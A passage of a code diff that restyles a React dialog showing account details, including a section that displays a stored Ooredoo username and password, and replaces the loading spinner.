-                  </h3>
-                  <div className="grid grid-cols-2 gap-2 text-sm">
-                    <div><span className="text-gray-500">{language === "ar" ? "المستخدم:" : "Username:"}</span> {details.ooredoo.ooredooUser}</div>
-                    <div><span className="text-gray-500">{language === "ar" ? "كلمة المرور:" : "Password:"}</span> {details.ooredoo.ooredooPassword}</div>
-                  </div>
-                </div>
-              )}
-            </div>
-          ) : (
-            <div className="p-12 flex justify-center">
-              <Loader2 className="animate-spin text-red-600 w-8 h-8" />
-            </div>
-          )}
+                {details.ooredoo && (
+                  <section className="space-y-4">
+                    <h4 className="text-[10px] font-black uppercase tracking-widest text-zinc-400">Ooredoo Credentials</h4>
+                    <div className="bg-purple-50 p-6 rounded-3xl border border-purple-100 grid grid-cols-2 gap-6">
+                      <div>
+                        <p className="text-[10px] font-bold text-purple-400 mb-1 uppercase">User</p>
+                        <p className="font-bold text-purple-900">{details.ooredoo.ooredooUser}</p>
+                      </div>
+                      <div>
+                        <p className="text-[10px] font-bold text-purple-400 mb-1 uppercase">Pass</p>
+                        <p className="font-bold text-purple-900">{details.ooredoo.ooredooPassword}</p>
+                      </div>
+                    </div>
+                  </section>
+                )}
+              </>
+            ) : (
+              <div className="py-20 text-center"><Loader2 className="w-10 h-10 animate-spin mx-auto text-red-600" /></div>
+            )}
+          </div>
         </DialogContent>
       </Dialog>
     </div>
